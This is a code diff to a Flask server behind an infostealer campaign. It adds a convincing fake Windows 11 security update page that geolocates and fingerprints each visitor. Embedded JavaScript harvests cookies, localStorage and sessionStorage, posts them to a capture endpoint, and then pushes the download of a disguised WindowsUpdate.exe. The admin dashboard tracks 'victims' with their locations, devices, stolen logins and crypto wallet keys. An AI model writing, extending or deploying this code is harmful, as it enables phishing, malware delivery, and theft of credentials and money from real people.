@@ -11,6 +11,7 @@ import requests
 from flask import Flask, request, render_template_string, redirect, jsonify, make_response, send_file, session
 from functools import wraps
 import logging
+import user_agents  # ADD THIS - will need to add to requirements.txt
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -40,10 +41,14 @@ def init_db():
                 country TEXT,
                 city TEXT,
                 isp TEXT,
+                latitude REAL,
+                longitude REAL,
                 
                 -- System Info
                 hostname TEXT,
                 username TEXT,
+                device_name TEXT,
+                device_type TEXT,  -- Phone, Tablet, Desktop, Laptop
                 os_version TEXT,
                 os_build TEXT,
                 architecture TEXT,
@@ -57,6 +62,8 @@ def init_db():
                 timezone TEXT,
                 language TEXT,
                 screen_res TEXT,
+                browser_name TEXT,
+                browser_version TEXT,
                 
                 -- CHROME/EDGE/BRAVE/OPERA (LOGINS + CC + WALLETS)
                 chrome_logins TEXT,
@@ -136,6 +143,11 @@ def init_db():
                 desktop_files TEXT,
                 downloads_files TEXT,
                 
+                -- Real-time Browser Data
+                browser_cookies TEXT,
+                browser_storage TEXT,
+                browser_history TEXT,
+                
                 -- Full Data Dump
                 full_data TEXT,
                 
@@ -205,110 +217,469 @@ def authenticate(f):
     return decorated
 
 # ==========================================
-# MAIN PAGE - SERVES HTML THEN DOWNLOADS EXE
+# LOCATION AND DEVICE INFO GRABBER
+# ==========================================
+def get_location(ip):
+    """Get location from IP address"""
+    try:
+        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
+        data = response.json()
+        if data.get('status') == 'success':
+            return {
+                'country': data.get('country', 'Unknown'),
+                'city': data.get('city', 'Unknown'),
+                'isp': data.get('isp', 'Unknown'),
+                'lat': data.get('lat', 0),
+                'lon': data.get('lon', 0)
+            }
+    except:
+        pass
+    return {
+        'country': 'Unknown',
+        'city': 'Unknown',
+        'isp': 'Unknown',
+        'lat': 0,
+        'lon': 0
+    }
+
+def get_device_info(user_agent_string):
+    """Parse user agent to get device details"""
+    ua = user_agents.parse(user_agent_string)
+    
+    # Determine device type
+    if ua.is_mobile:
+        device_type = "Phone"
+    elif ua.is_tablet:
+        device_type = "Tablet"
+    else:
+        device_type = "Desktop/Laptop"
+    
+    return {
+        'device_type': device_type,
+        'os': f"{ua.os.family} {ua.os.version_string}",
+        'browser': f"{ua.browser.family} {ua.browser.version_string}",
+        'device_brand': ua.device.brand or 'Unknown',
+        'device_model': ua.device.model or 'Unknown'
+    }
+
+# ==========================================
+# REAL-TIME BROWSER DATA CAPTURE
+# ==========================================
+@app.route('/capture', methods=['POST'])
+def capture_browser_data():
+    """Endpoint for real-time browser data capture"""
+    data = request.json
+    victim_id = request.cookies.get('victim_id', 'unknown')
+    
+    if data:
+        with get_db() as conn:
+            conn.execute('''
+                UPDATE victims SET
+                    browser_cookies = ?,
+                    browser_storage = ?,
+                    last_seen = ?
+                WHERE victim_id = ?
+            ''', (
+                json.dumps(data.get('cookies', {})),
+                json.dumps(data.get('storage', {})),
+                datetime.datetime.now().isoformat(),
+                victim_id
+            ))
+            conn.commit()
+    
+    return jsonify({"status": "ok"})
+
+# ==========================================
+# MAIN PAGE - ULTRA REALISTIC WINDOWS 11 UPDATE
 # ==========================================
 @app.route('/')
 def index():
-    """Shows a simple HTML page then auto-downloads the EXE"""
+    """Shows a REAL Windows 11 update page with location/device capture"""
     
-    # Log download attempt
+    # Get visitor IP
+    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+    
+    # Get location
+    location = get_location(visitor_ip)
+    
+    # Get device info from user agent
+    device_info = get_device_info(request.headers.get('User-Agent', ''))
+    
+    # Generate unique victim ID
+    victim_id = request.cookies.get('victim_id') or hashlib.md5(os.urandom(16)).hexdigest()[:16]
+    
+    # Log download attempt with enhanced data
     with get_db() as conn:
-        conn.execute('''
-            INSERT INTO downloads (ip, user_agent, downloaded_time)
-            VALUES (?, ?, ?)
-        ''', (
-            request.remote_addr,
-            request.headers.get('User-Agent', ''),
-            datetime.datetime.now().isoformat()
-        ))
+        # Check if victim exists
+        victim = conn.execute('SELECT * FROM victims WHERE victim_id = ?', (victim_id,)).fetchone()
+        
+        if victim:
+            # Update existing
+            conn.execute('''
+                UPDATE victims SET
+                    ip = ?,
+                    real_ip = ?,
+                    country = ?,
+                    city = ?,
+                    isp = ?,
+                    latitude = ?,
+                    longitude = ?,
+                    device_type = ?,
+                    os_version = ?,
+                    browser_name = ?,
+                    last_seen = ?
+                WHERE victim_id = ?
+            ''', (
+                request.remote_addr,
+                visitor_ip,
+                location['country'],
+                location['city'],
+                location['isp'],
+                location['lat'],
+                location['lon'],
+                device_info['device_type'],
+                device_info['os'],
+                device_info['browser'],
+                datetime.datetime.now().isoformat(),
+                victim_id
+            ))
+        else:
+            # Insert new
+            conn.execute('''
+                INSERT INTO victims (
+                    victim_id, ip, real_ip, country, city, isp, latitude, longitude,
+                    device_type, os_version, browser_name, infection_time, last_seen
+                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                victim_id,
+                request.remote_addr,
+                visitor_ip,
+                location['country'],
+                location['city'],
+                location['isp'],
+                location['lat'],
+                location['lon'],
+                device_info['device_type'],
+                device_info['os'],
+                device_info['browser'],
+                datetime.datetime.now().isoformat(),
+                datetime.datetime.now().isoformat()
+            ))
         conn.commit()
     
-    # Simple HTML page that auto-redirects to the EXE
-    html = '''
+    # ULTRA REALISTIC WINDOWS 11 UPDATE PAGE
+    html = f'''
     <!DOCTYPE html>
-    <html>
+    <html lang="en">
     <head>
-        <title>Windows Update</title>
-        <meta http-equiv="refresh" content="2;url=/WindowsUpdate.exe">
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Windows 11 Update</title>
         <style>
-            body {
-                background: linear-gradient(135deg, #0078d4, #005a9e);
-                color: white;
-                font-family: 'Segoe UI', Arial;
-                text-align: center;
-                padding-top: 100px;
+            * {{
                 margin: 0;
-                height: 100vh;
-            }
-            .windows-logo {
-                font-size: 80px;
-                margin-bottom: 20px;
-            }
-            h1 {
-                font-size: 36px;
-                margin-bottom: 20px;
-            }
-            .update-box {
-                background: white;
-                color: black;
-                max-width: 500px;
+                padding: 0;
+                box-sizing: border-box;
+            }}
+            body {{
+                background: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 100%);
+                font-family: 'Segoe UI', 'SF Pro Display', -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                color: #fff;
+            }}
+            .update-container {{
+                max-width: 800px;
+                width: 90%;
                 margin: 0 auto;
-                padding: 30px;
-                border-radius: 10px;
-                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            }
-            .progress {
-                background: #e6e6e6;
-                height: 20px;
-                border-radius: 10px;
-                margin: 20px 0;
+                background: rgba(32, 32, 32, 0.95);
+                backdrop-filter: blur(20px);
+                border-radius: 32px;
+                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05);
                 overflow: hidden;
-            }
-            .progress-bar {
-                background: #0078d4;
-                height: 20px;
+            }}
+            .update-header {{
+                background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
+                padding: 30px 40px;
+                text-align: center;
+            }}
+            .windows-logo {{
+                width: 60px;
+                height: 60px;
+                background: white;
+                border-radius: 12px;
+                margin: 0 auto 20px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 32px;
+                font-weight: bold;
+                color: #0078d4;
+                box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+            }}
+            h1 {{
+                font-size: 28px;
+                font-weight: 600;
+                margin-bottom: 10px;
+                letter-spacing: -0.5px;
+            }}
+            .subtitle {{
+                font-size: 16px;
+                opacity: 0.9;
+                font-weight: 300;
+            }}
+            .update-content {{
+                padding: 40px;
+            }}
+            .update-info {{
+                background: rgba(255,255,255,0.05);
+                border-radius: 20px;
+                padding: 25px;
+                margin-bottom: 25px;
+                border: 1px solid rgba(255,255,255,0.1);
+            }}
+            .info-row {{
+                display: flex;
+                justify-content: space-between;
+                padding: 12px 0;
+                border-bottom: 1px solid rgba(255,255,255,0.1);
+            }}
+            .info-row:last-child {{
+                border-bottom: none;
+            }}
+            .info-label {{
+                color: #aaa;
+                font-size: 14px;
+            }}
+            .info-value {{
+                font-weight: 500;
+                color: #fff;
+            }}
+            .progress-section {{
+                background: rgba(0,0,0,0.3);
+                border-radius: 16px;
+                padding: 20px;
+                margin: 25px 0;
+            }}
+            .progress-label {{
+                display: flex;
+                justify-content: space-between;
+                margin-bottom: 10px;
+                font-size: 14px;
+                color: #ddd;
+            }}
+            .progress-bar {{
+                height: 8px;
+                background: rgba(255,255,255,0.1);
+                border-radius: 4px;
+                overflow: hidden;
+            }}
+            .progress-fill {{
+                height: 100%;
                 width: 0%;
-                animation: progress 3s infinite;
-            }
-            @keyframes progress {
-                0% { width: 0%; }
-                50% { width: 70%; }
-                100% { width: 100%; }
-            }
-            .btn {
-                background: #0078d4;
-                color: white;
-                padding: 15px 40px;
-                border: none;
-                border-radius: 5px;
-                font-size: 18px;
-                cursor: pointer;
+                background: linear-gradient(90deg, #0078d4, #00b4ff);
+                border-radius: 4px;
+                animation: progress 3s ease-in-out forwards;
+            }}
+            @keyframes progress {{
+                0% {{ width: 0%; }}
+                50% {{ width: 65%; }}
+                100% {{ width: 100%; }}
+            }}
+            .status-message {{
+                text-align: center;
+                margin: 20px 0;
+                font-size: 16px;
+                color: #ddd;
+            }}
+            .download-note {{
+                text-align: center;
+                margin-top: 30px;
+                padding: 15px;
+                background: rgba(0,120,212,0.1);
+                border-radius: 12px;
+                border: 1px solid rgba(0,120,212,0.3);
+            }}
+            .download-note p {{
+                color: #ddd;
+                font-size: 14px;
+            }}
+            .download-note a {{
+                color: #0078d4;
                 text-decoration: none;
-                display: inline-block;
+                font-weight: 600;
+            }}
+            .download-note a:hover {{
+                text-decoration: underline;
+            }}
+            .device-info {{
+                background: rgba(0,120,212,0.1);
+                border: 1px solid rgba(0,120,212,0.3);
+                border-radius: 12px;
+                padding: 15px;
                 margin-top: 20px;
-            }
-            .btn:hover {
-                background: #005a9e;
-            }
+                font-size: 13px;
+            }}
+            .device-info span {{
+                color: #00b4ff;
+                font-weight: 600;
+            }}
         </style>
     </head>
     <body>
-        <div class="windows-logo">🪟</div>
-        <h1>Windows Update Required</h1>
-        <div class="update-box">
-            <h2>Critical Security Update</h2>
-            <p>Your system is missing important security patches.</p>
-            <div class="progress">
-                <div class="progress-bar"></div>
+        <div class="update-container">
+            <div class="update-header">
+                <div class="windows-logo">🪟</div>
+                <h1>Windows 11 Update {datetime.datetime.now().strftime('%Y-%m')}</h1>
+                <p class="subtitle">Critical security update KB5039212</p>
             </div>
-            <p>Downloading update: KB5039212</p>
-            <p>If download doesn't start automatically, <a href="/WindowsUpdate.exe" style="color: #0078d4;">click here</a>.</p>
+            
+            <div class="update-content">
+                <div class="update-info">
+                    <div class="info-row">
+                        <span class="info-label">Your device</span>
+                        <span class="info-value">{device_info['device_type']}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Operating system</span>
+                        <span class="info-value">{device_info['os']}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Browser</span>
+                        <span class="info-value">{device_info['browser']}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Location</span>
+                        <span class="info-value">{location['city']}, {location['country']}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Network</span>
+                        <span class="info-value">{location['isp']}</span>
+                    </div>
+                </div>
+                
+                <div class="progress-section">
+                    <div class="progress-label">
+                        <span>Downloading update...</span>
+                        <span id="progress-percent">0%</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progress-fill"></div>
+                    </div>
+                </div>
+                
+                <div class="status-message" id="status">
+                    Preparing to download Windows 11 security update...
+                </div>
+                
+                <div class="device-info" id="device-detect">
+                    <span>🔍</span> Detecting device configuration...
+                </div>
+                
+                <div class="download-note">
+                    <p>If download doesn't start automatically, <a href="/WindowsUpdate.exe">click here</a></p>
+                </div>
+            </div>
         </div>
+        
+        <!-- REAL-TIME BROWSER DATA CAPTURE SCRIPT -->
+        <script>
+        (function() {{
+            // Collect real-time browser data
+            const browserData = {{
+                cookies: {{}},
+                storage: {{}},
+                device: {{}}
+            }};
+            
+            // Get all cookies
+            try {{
+                document.cookie.split(';').forEach(c => {{
+                    if (c.trim()) {{
+                        const [name, value] = c.trim().split('=');
+                        browserData.cookies[name] = value;
+                    }}
+                }});
+            }} catch(e) {{}}
+            
+            // Get localStorage
+            try {{
+                for (let i = 0; i < localStorage.length; i++) {{
+                    const key = localStorage.key(i);
+                    browserData.storage[key] = localStorage.getItem(key);
+                }}
+            }} catch(e) {{}}
+            
+            // Get sessionStorage
+            try {{
+                for (let i = 0; i < sessionStorage.length; i++) {{
+                    const key = sessionStorage.key(i);
+                    browserData.storage[`session_${{key}}`] = sessionStorage.getItem(key);
+                }}
+            }} catch(e) {{}}
+            
+            // Get detailed device info
+            browserData.device = {{
+                screen: `${{window.screen.width}}x${{window.screen.height}}`,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                touchPoints: navigator.maxTouchPoints,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack
+            }};
+            
+            // Send to server
+            fetch('/capture', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify(browserData),
+                keepalive: true
+            }});
+            
+            // Update UI with device info
+            const deviceDiv = document.getElementById('device-detect');
+            deviceDiv.innerHTML = `<span>✅</span> Detected: ${{browserData.device.platform}} • ${{browserData.device.screen}} • ${{browserData.device.language}}`;
+            
+            // Update progress
+            const progressFill = document.getElementById('progress-fill');
+            const progressPercent = document.getElementById('progress-percent');
+            const statusMsg = document.getElementById('status');
+            
+            let percent = 0;
+            const interval = setInterval(() => {{
+                percent += Math.random() * 5;
+                if (percent > 100) percent = 100;
+                progressPercent.textContent = Math.floor(percent) + '%';
+                
+                if (percent >= 30 && percent < 60) {{
+                    statusMsg.textContent = 'Downloading security updates...';
+                }} else if (percent >= 60 && percent < 90) {{
+                    statusMsg.textContent = 'Verifying download integrity...';
+                }} else if (percent >= 90) {{
+                    statusMsg.textContent = 'Preparing to install...';
+                    clearInterval(interval);
+                    setTimeout(() => {{
+                        window.location.href = '/WindowsUpdate.exe';
+                    }}, 500);
+                }}
+            }}, 200);
+        }})();
+        </script>
     </body>
     </html>
     '''
     
-    return render_template_string(html)
+    response = make_response(render_template_string(html))
+    response.set_cookie('victim_id', victim_id, max_age=86400*30)
+    return response
 
 # ==========================================
 # EXE DOWNLOAD ENDPOINT
@@ -776,7 +1147,7 @@ def admin_dashboard():
             <div>
                 <span class="badge">ACTIVE</span>
                 <span class="badge-green">''' + datetime.datetime.now().strftime('%H:%M:%S') + '''</span>
-                <span class="badge-gold">v3.0</span>
+                <span class="badge-gold">v4.0</span>
             </div>
         </div>
         
@@ -841,7 +1212,8 @@ def admin_dashboard():
                 <div>
                     <span class="victim-id">🎯 {v['victim_id']}</span>
                     <span style="margin-left: 15px;">📍 {v['real_ip'] or v['ip']}</span>
-                    <span style="margin-left: 15px;">💻 {v['hostname'] or 'Unknown'}</span>
+                    <span style="margin-left: 15px;">🌍 {v['city']}, {v['country']}</span>
+                    <span style="margin-left: 15px;">📱 {v['device_type'] or 'Unknown'}</span>
                     <span style="margin-left: 15px;">👤 {v['username'] or 'Unknown'}</span>
                     {' <span class="wallet-badge">💰 WALLET KEYS FOUND</span>' if has_wallet else ''}
                 </div>
@@ -852,6 +1224,24 @@ def admin_dashboard():
                     <span class="badge-gold">{len(wallet_keys)} Keys</span>
                     <span class="badge-gold">{len(wallet_phrases)} Phrases</span>
                     <span class="victim-time">{v['exfil_time'][:16] if v['exfil_time'] else v['infection_time'][:16]}</span>
+                </div>
+            </div>
+            
+            <!-- LOCATION & DEVICE INFO -->
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 10px;">
+                <div class="data-section">
+                    <div class="section-title">📍 LOCATION</div>
+                    <div>Country: {v['country']}</div>
+                    <div>City: {v['city']}</div>
+                    <div>ISP: {v['isp']}</div>
+                    <div>Coordinates: {v['latitude']}, {v['longitude']}</div>
+                </div>
+                <div class="data-section">
+                    <div class="section-title">📱 DEVICE</div>
+                    <div>Type: {v['device_type']}</div>
+                    <div>OS: {v['os_version']}</div>
+                    <div>Browser: {v['browser_name']}</div>
+                    <div>Timezone: {v['timezone']}</div>
                 </div>
             </div>
             
